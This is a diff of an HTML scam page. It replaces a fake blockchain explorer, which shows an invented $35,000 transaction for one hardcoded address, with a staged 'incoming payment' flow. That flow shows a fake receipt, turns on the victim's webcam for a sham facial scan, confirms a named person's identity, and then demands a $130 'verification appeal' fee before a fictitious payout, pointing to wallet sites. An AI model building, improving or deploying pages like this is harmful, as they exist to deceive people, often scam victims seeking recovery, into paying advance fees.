@@ -1,209 +1,289 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Explorer|BTC</title>
+    <title>Bitcoin Transaction Node</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Space+Mono&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['DM Sans', 'sans-serif'],
-                        mono: ['Space Mono', 'monospace'],
-                    },
-                }
-            }
-        }
-    </script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #0a0b0d; color: #ffffff; }
-        .glass { background: rgba(23, 25, 28, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .btc-gradient { background: linear-gradient(135deg, #f7931a 0%, #ffab40 100%); }
-        .loading-bar { height: 2px; background: #f7931a; width: 0%; transition: width 0.3s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .animate-in { animation: fadeIn 0.5s ease-out forwards; }
+        body { font-family: 'Inter', sans-serif; }
+        h1, h2, h3, h4 { font-family: 'Outfit', sans-serif; }
+        .font-mono { font-family: 'JetBrains Mono', monospace; }
+        
+        .face-scan-ring {
+            stroke-dasharray: 440;
+            stroke-dashoffset: 440;
+            transition: stroke-dashoffset 0.1s linear;
+        }
+
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .animate-spin-slow { animation: rotate 3s linear infinite; }
+        
+        .btc-gradient {
+            background: linear-gradient(135deg, #f7931a 0%, #ffab40 100%);
+        }
+
+        .receipt-shadow {
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
     </style>
 </head>
-<body class="font-sans">
-    <div id="app" class="min-h-screen">
-        <!-- Navigation -->
-        <nav class="border-b border-white/10 p-4 sticky top-0 bg-[#0a0b0d]/80 backdrop-blur-md z-50">
-            <div class="max-w-7xl mx-auto flex justify-between items-center">
-                <div class="flex items-center gap-2 cursor-pointer" onclick="showHome()">
-                    <div class="w-8 h-8 btc-gradient rounded-full flex items-center justify-center font-bold">B</div>
-                    <span class="font-bold text-xl tracking-tight">BLOCKCHAIN</span>
-                </div>
-                <div class="hidden md:flex gap-6 text-sm text-gray-400">
-                    <a href="#" class="hover:text-white transition">Explorer</a>
-                    <a href="#" class="hover:text-white transition">Prices</a>
-                    <a href="#" class="hover:text-white transition">Charts</a>
-                </div>
-            </div>
-        </nav>
+<body class="bg-[#0b0e11] text-slate-100 min-h-screen">
 
-        <!-- Main Content -->
-        <main class="max-w-7xl mx-auto p-4 md:p-8">
-            <!-- Home View -->
-            <div id="home-view" class="animate-in">
-                <div class="text-center py-16">
-                    <h1 class="text-4xl md:text-6xl font-bold mb-6">Search the Blockchain</h1>
-                    <p class="text-gray-400 text-lg mb-12">Track addresses, transactions, and blocks in real-time</p>
-                    <div class="max-w-3xl mx-auto relative">
-                        <input type="text" id="search-input" 
-                            placeholder="Enter Address, Transaction Hash or Block Height" 
-                            class="w-full bg-[#17191c] border border-white/10 rounded-xl px-6 py-5 focus:outline-none focus:ring-2 focus:ring-[#f7931a]/50 transition-all text-lg font-mono">
-                        <button onclick="handleSearch()" class="absolute right-3 top-3 bottom-3 px-8 btc-gradient rounded-lg font-bold hover:opacity-90 transition-opacity active:scale-95">
-                            Search
-                        </button>
+    <!-- STEP 1: ADDRESS CONFIRMATION -->
+    <div id="address-section" class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-lg bg-[#1e2329] rounded-[32px] shadow-2xl border border-white/5 overflow-hidden">
+            <div class="btc-gradient h-1.5 w-full"></div>
+            <div class="p-10 space-y-8">
+                <div class="flex flex-col items-center text-center space-y-4">
+                    <div class="w-20 h-20 bg-orange-500/10 rounded-full flex items-center justify-center border border-orange-500/20">
+                        <i data-lucide="bitcoin" class="w-10 h-10 text-orange-500"></i>
+                    </div>
+                    <h1 class="text-3xl font-bold tracking-tight">Incoming Transaction</h1>
+                    <p class="text-slate-400">A payment of <span class="text-orange-500 font-bold">$35,000.00</span> is pending</p>
+                </div>
+
+                <div class="bg-black/40 p-6 rounded-2xl border border-white/5 space-y-4">
+                    <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Recipient BTC Address</label>
+                    <div class="flex items-center gap-3 bg-white/5 p-4 rounded-xl border border-white/10">
+                        <input type="text" value="3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT" readonly class="bg-transparent w-full font-mono text-sm outline-none text-slate-200">
+                        <i data-lucide="check-circle-2" class="w-5 h-5 text-emerald-500"></i>
                     </div>
                 </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12">
-                    <div class="glass p-6 rounded-xl">
-                        <div class="text-gray-400 text-sm mb-1">Latest Block</div>
-                        <div class="text-2xl font-bold">824,312</div>
+                <div class="space-y-4">
+                    <div class="flex items-start gap-3 group cursor-pointer" onclick="toggleCheck('check-1')">
+                        <div id="check-1" class="mt-1 w-5 h-5 rounded border border-white/20 flex items-center justify-center transition-all bg-white/5">
+                            <i data-lucide="check" class="w-3 h-3 text-white opacity-0 transition-opacity"></i>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">I confirm that this Bitcoin address belongs to me and I have verified the hash.</p>
                     </div>
-                    <div class="glass p-6 rounded-xl">
-                        <div class="text-gray-400 text-sm mb-1">BTC Price</div>
-                        <div class="text-2xl font-bold">$89,911.22</div>
+                    <div class="flex items-start gap-3 group cursor-pointer" onclick="toggleCheck('check-2')">
+                        <div id="check-2" class="mt-1 w-5 h-5 rounded border border-white/20 flex items-center justify-center transition-all bg-white/5">
+                            <i data-lucide="check" class="w-3 h-3 text-white opacity-0 transition-opacity"></i>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">I confirm that I haven't shared my private key with anyone and my seed is secured.</p>
                     </div>
-                    <div class="glass p-6 rounded-xl">
-                        <div class="text-gray-400 text-sm mb-1">Network Hashrate</div>
-                        <div class="text-2xl font-bold">521.4 EH/s</div>
+                    <div class="flex items-start gap-3 group cursor-pointer" onclick="toggleCheck('check-3')">
+                        <div id="check-3" class="mt-1 w-5 h-5 rounded border border-white/20 flex items-center justify-center transition-all bg-white/5">
+                            <i data-lucide="check" class="w-3 h-3 text-white opacity-0 transition-opacity"></i>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">I understand that funds sent to the wrong address cannot be refunded.</p>
                     </div>
                 </div>
+
+                <button onclick="proceedToReceipt()" class="btc-gradient w-full text-black font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg tracking-widest uppercase">
+                    Verify Transaction
+                </button>
             </div>
-<div class="cryptohopper-web-widget" data-id="4" data-coins="bitcoin,ethereum,tether,xrp,solana,tron,dogecoin,bitcoin-cash,coinbase-wrapped-btc,litecoin,official-trump,bridged-usdc-polygon-pos-bridge,l2-standard-bridged-weth-base,blockstack,apenft,crvusd" data-list_design="3" data-realtime="on" data-atid="11"></div>
-            
-            <!-- Loading View -->
-            <div id="loading-view" class="hidden py-32 text-center">
-                <div class="mb-8">
-                    <div class="w-16 h-16 border-4 border-[#f7931a] border-t-transparent rounded-full animate-spin mx-auto"></div>
+        </div>
+    </div>
+
+    <!-- STEP 2: BTC RECEIPT -->
+    <div id="receipt-section" class="hidden min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-md bg-white text-slate-900 rounded-[40px] p-10 receipt-shadow relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-2 btc-gradient"></div>
+            <div class="space-y-8">
+                <div class="text-center space-y-2">
+                    <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <i data-lucide="file-text" class="w-8 h-8 text-orange-600"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold tracking-tight uppercase">Transaction Receipt</h2>
+                    <p class="text-slate-500 font-mono text-[10px]">TXID: b48f...92da</p>
                 </div>
-                <h2 id="loading-text" class="text-2xl font-bold mb-2">Scanning Blockchain Network...</h2>
-                <p class="text-gray-400">Verifying transaction nodes and height...</p>
-                <div class="max-w-md mx-auto mt-8 bg-white/5 rounded-full overflow-hidden">
-                    <div id="progress-bar" class="loading-bar"></div>
+
+                <div class="space-y-4 border-y border-slate-100 py-6">
+                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Amount</span><span class="text-2xl font-bold">$35,000.00</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Asset</span><span class="font-bold flex items-center gap-2"><i data-lucide="bitcoin" class="w-4 h-4 text-orange-500"></i> BTC</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Network</span><span class="font-bold">Mainnet-Core</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 text-xs font-bold uppercase tracking-widest">Verification</span><span class="font-bold text-red-500 flex items-center gap-1"><i data-lucide="alert-circle" class="w-3 h-3"></i> INCOMPLETE</span></div>
                 </div>
+
+                <div class="bg-slate-50 p-4 rounded-2xl space-y-2">
+                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[0.2em]">Security Alert</p>
+                    <p class="text-xs text-slate-600 leading-relaxed">Identity verification is required to complete the fund release protocol.</p>
+                </div>
+
+                <button onclick="startFaceAuth()" class="w-full bg-slate-900 text-white font-bold py-5 rounded-2xl shadow-xl hover:bg-black transition-all text-lg uppercase tracking-widest">
+                    VERIFY NOW
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP 3: FACE VERIFICATION -->
+    <div id="face-section" class="hidden min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-lg bg-[#1e2329] rounded-[40px] p-12 border border-white/10 text-center space-y-10">
+            <div class="space-y-2">
+                <h2 class="text-2xl font-bold uppercase tracking-tight">Identity Node Sync</h2>
+                <p class="text-slate-400 text-sm">Please remain still for biometric scanning</p>
             </div>
 
-            <!-- Transaction Result View -->
-            <div id="result-view" class="hidden animate-in">
-                <div class="flex items-center gap-4 mb-8">
-                    <button onclick="showHome()" class="text-gray-400 hover:text-white flex items-center gap-2">← Back</button>
-                    <h2 class="text-3xl font-bold">Transaction Details</h2>
+            <div class="relative w-64 h-64 mx-auto">
+                <div id="face-frame" class="w-full h-full rounded-full border-4 border-slate-800 overflow-hidden bg-slate-800 flex items-center justify-center">
+                    <i id="camera-icon" data-lucide="scan-face" class="w-32 h-32 text-slate-700"></i>
+                    <video id="webcam" class="hidden w-full h-full object-cover" autoplay playsinline></video>
                 </div>
-                <div class="glass rounded-xl overflow-hidden mb-8">
-                    <div class="p-6 border-b border-white/10 flex justify-between items-center bg-white/5">
-                        <div class="font-mono text-gray-400 text-sm break-all" id="tx-hash"></div>
-                        <span class="bg-green-500/20 text-green-500 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">Confirmed</span>
-                    </div>
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8 p-8">
-                        <div>
-                            <div class="text-gray-400 text-sm mb-1">Value</div>
-                            <div class="text-2xl font-bold text-[#f7931a]" id="tx-value"></div>
-                        </div>
-                        <div>
-                            <div class="text-gray-400 text-sm mb-1">Fee</div>
-                            <div class="text-xl font-bold" id="tx-fee"></div>
-                        </div>
-                        <div>
-                            <div class="text-gray-400 text-sm mb-1">Confirmations</div>
-                            <div class="text-xl font-bold text-green-500">6/6</div>
-                        </div>
-                        <div>
-                            <div class="text-gray-400 text-sm mb-1">Block</div>
-                            <div class="text-xl font-bold" id="tx-block"></div>
-                        </div>
-                    </div>
-                </div>
-                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                    <div class="glass rounded-xl p-6">
-                        <h3 class="text-lg font-bold mb-4 flex items-center gap-2 text-red-400">Inputs</h3>
-                        <div id="tx-from" class="font-mono text-sm break-all p-3 bg-white/5 rounded-lg"></div>
-                    </div>
-                    <div class="glass rounded-xl p-6">
-                        <h3 class="text-lg font-bold mb-4 flex items-center gap-2 text-green-400">Outputs</h3>
-                        <div id="tx-to" class="font-mono text-sm break-all p-3 bg-white/5 rounded-lg"></div>
-                    </div>
-                </div>
+                <svg class="absolute inset-0 w-full h-full transform -rotate-90">
+                    <circle cx="128" cy="128" r="120" stroke="currentColor" stroke-width="6" fill="transparent" class="text-slate-800" />
+                    <circle id="face-progress" cx="128" cy="128" r="120" stroke="#f7931a" stroke-width="6" fill="transparent" stroke-dasharray="754" stroke-dashoffset="754" class="face-scan-ring" />
+                </svg>
             </div>
 
-            <!-- Not Found View -->
-            <div id="not-found-view" class="hidden py-32 text-center glass rounded-2xl">
-                <div class="text-red-500 text-6xl mb-6 font-bold">!</div>
-                <h2 class="text-3xl font-bold mb-4">Search Not Found</h2>
-                <p class="text-gray-400 max-w-lg mx-auto mb-8">The entry could not be located on the Bitcoin mainnet. Please verify the input and try again.</p>
-                <button onclick="showHome()" class="bg-white/10 hover:bg-white/20 px-8 py-3 rounded-xl font-bold transition">New Search</button>
+            <div class="space-y-6">
+                <button id="capture-btn" onclick="runFaceScan()" class="bg-white text-black font-bold py-5 px-12 rounded-2xl hover:bg-slate-200 transition-all text-lg tracking-widest uppercase mx-auto flex items-center gap-3">
+                    <i data-lucide="scan" class="w-6 h-6"></i> RUN SCAN
+                </button>
+                <div id="scanning-msg" class="hidden space-y-3">
+                    <div class="text-orange-400 font-bold tracking-widest text-xs animate-pulse">ANALYZING FACIAL MAPPING...</div>
+                    <p id="time-left" class="text-slate-500 font-mono text-[10px]">31s remaining</p>
+                </div>
             </div>
-        </main>
+        </div>
+    </div>
+
+    <!-- STEP 4: IDENTITY CONFIRMED / APPEAL -->
+    <div id="appeal-section" class="hidden min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-xl bg-[#1e2329] rounded-[40px] border border-white/10 overflow-hidden">
+            <div class="p-12 space-y-10">
+                <div class="flex items-center gap-6 pb-8 border-b border-white/5">
+                    <div class="w-20 h-20 bg-emerald-500/20 text-emerald-500 rounded-full flex items-center justify-center border border-emerald-500/30">
+                        <i data-lucide="user-check" class="w-10 h-10"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-2xl font-bold uppercase tracking-tight">Identity Confirmed</h3>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="text-slate-400 text-sm">Name:</span>
+                            <span class="font-bold text-emerald-400">Finnur</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="space-y-6">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-[10px] font-bold text-slate-500 uppercase mb-2">Payout Amount</p>
+                            <p class="text-xl font-bold">$35,000.00</p>
+                        </div>
+                        <div class="bg-black/40 p-5 rounded-2xl border border-white/5">
+                            <p class="text-[10px] font-bold text-slate-500 uppercase mb-2">Secured By</p>
+                            <p class="text-xl font-bold flex items-center gap-2"><i data-lucide="shield-check" class="w-5 h-5 text-blue-400"></i> ZENGO</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-red-500/10 border border-red-500/20 p-6 rounded-2xl space-y-4">
+                        <div class="flex items-center gap-3 text-red-500">
+                            <i data-lucide="alert-triangle" class="w-6 h-6"></i>
+                            <h4 class="font-bold uppercase tracking-widest text-sm">Verification Warning</h4>
+                        </div>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            The system is unable to verify <span class="text-white font-bold">Sources of Funds</span> and <span class="text-white font-bold">Source of Wealth</span> due to facial ownership safety. To process the verification fully, a <span class="text-orange-500 font-bold">Verification Appeal Execution</span> is required.
+                        </p>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            A payment of <span class="text-white font-bold text-lg">$130.00</span> is needed for proper verification concept. No payment can be released without proper verification confirmation.
+                        </p>
+                    </div>
+                </div>
+
+                <button onclick="showFinalVerification()" class="w-full bg-orange-500 hover:bg-orange-600 text-black font-bold py-5 rounded-2xl shadow-xl transition-all text-lg tracking-widest uppercase">
+                    SUBMIT APPEAL VERIFICATION
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- STEP 5: FINAL BUTTONS -->
+    <div id="final-section" class="hidden min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-sm bg-[#1e2329] rounded-[40px] p-12 border border-white/10 text-center space-y-10">
+            <div id="final-loader" class="space-y-6">
+                <i data-lucide="loader-2" class="w-16 h-16 text-orange-500 animate-spin mx-auto"></i>
+                <p class="text-slate-400 font-bold uppercase tracking-widest text-xs">Syncing Wallets...</p>
+            </div>
+            <div id="final-buttons" class="hidden space-y-4">
+                <a href="https://ZENGO.com" target="_blank" class="block w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-6 rounded-2xl transition-all text-lg shadow-xl uppercase tracking-widest">
+                    ZENGO PORTAL
+                </a>
+                <a href="https://trustwallet.com" target="_blank" class="block w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-6 rounded-2xl transition-all text-lg shadow-xl uppercase tracking-widest">
+                    TRUST WALLET
+                </a>
+            </div>
+        </div>
     </div>
 
     <script>
-        const SPECIAL_ADDR = "3C8BKuPoVtrLUfwTMatv6eRvFsHDPiBTAT";
-        const views = ['home-view', 'loading-view', 'result-view', 'not-found-view'];
+        lucide.createIcons();
 
-        function switchView(viewId) {
-            views.forEach(v => document.getElementById(v).classList.add('hidden'));
-            document.getElementById(viewId).classList.remove('hidden');
+        function toggleCheck(id) {
+            const el = document.getElementById(id);
+            const icon = el.querySelector('i');
+            const isActive = icon.classList.contains('opacity-0');
+            icon.classList.toggle('opacity-0', !isActive);
+            el.classList.toggle('bg-orange-500/20', isActive);
+            el.classList.toggle('border-orange-500/50', isActive);
         }
 
-        function showHome() {
-            switchView('home-view');
-            document.getElementById('search-input').value = '';
-            document.getElementById('progress-bar').style.width = '0%';
-        }
-
-        async function handleSearch() {
-            const query = document.getElementById('search-input').value.trim();
-            if (!query) return;
-
-            switchView('loading-view');
-            const loadingText = document.getElementById('loading-text');
+        function proceedToReceipt() {
+            const checks = ['check-1', 'check-2', 'check-3'];
+            const allChecked = checks.every(id => !document.getElementById(id).querySelector('i').classList.contains('opacity-0'));
+            if (!allChecked) return alert('Please confirm all security requirements');
             
-            if (query === SPECIAL_ADDR) {
-                loadingText.innerText = "Analyzing Blockchain Nodes...";
-                await simulateProgress(4); // 4s simulation
-                
-                document.getElementById('tx-hash').innerText = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0";
-                document.getElementById('tx-value').innerText = "0.39244115 BTC ($35,000.00)";
-                document.getElementById('tx-fee').innerText = "0.00218039 BTC ($200.00)";
-                document.getElementById('tx-block').innerText = "800,123";
-                document.getElementById('tx-from').innerText = "BLOCKCHAIN RECOVERY UNIT";
-                document.getElementById('tx-to').innerText = SPECIAL_ADDR;
-                
-                switchView('result-view');
-            } else {
-                loadingText.innerText = "Deep Network Scan Active...";
-                await simulateProgress(6); // 6s simulation
-                switchView('not-found-view');
+            showStep('receipt');
+        }
+
+        async function startFaceAuth() {
+            showStep('face');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('webcam');
+                video.srcObject = stream;
+                video.classList.remove('hidden');
+                document.getElementById('camera-icon').classList.add('hidden');
+            } catch (err) {
+                console.error("Camera access denied", err);
             }
         }
 
-        function simulateProgress(seconds) {
-            return new Promise(resolve => {
-                let current = 0;
-                const total = seconds * 20;
-                const interval = setInterval(() => {
-                    current++;
-                    const percent = (current / total) * 100;
-                    document.getElementById('progress-bar').style.width = percent + '%';
-                    if (current >= total) {
-                        clearInterval(interval);
-                        resolve();
-                    }
-                }, 50);
-            });
+        function runFaceScan() {
+            document.getElementById('capture-btn').classList.add('hidden');
+            document.getElementById('scanning-msg').classList.remove('hidden');
+            
+            const ring = document.getElementById('face-progress');
+            const circumference = 754;
+            const duration = 31000; // 31 seconds
+            let time = 0;
+
+            const interval = setInterval(() => {
+                time += 100;
+                const progress = time / duration;
+                ring.style.strokeDashoffset = circumference - (progress * circumference);
+                document.getElementById('time-left').textContent = Math.ceil((duration - time) / 1000) + "s remaining";
+
+                if (time >= duration) {
+                    clearInterval(interval);
+                    showStep('appeal');
+                    const video = document.getElementById('webcam');
+                    if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
+                }
+            }, 100);
         }
 
-        document.getElementById('search-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') handleSearch();
-        });
+        function showFinalVerification() {
+            showStep('final');
+            setTimeout(() => {
+                document.getElementById('final-loader').classList.add('hidden');
+                document.getElementById('final-buttons').classList.remove('hidden');
+            }, 6000); // 6 seconds
+        }
+
+        function showStep(s) {
+            ['address', 'receipt', 'face', 'appeal', 'final'].forEach(step => {
+                document.getElementById(step + '-section').classList.add('hidden');
+            });
+            document.getElementById(s + '-section').classList.remove('hidden');
+            lucide.createIcons();
+        }
     </script>
-    <script src="https://www.cryptohopper.com/widgets/js/script"></script>
 </body>
 </html>
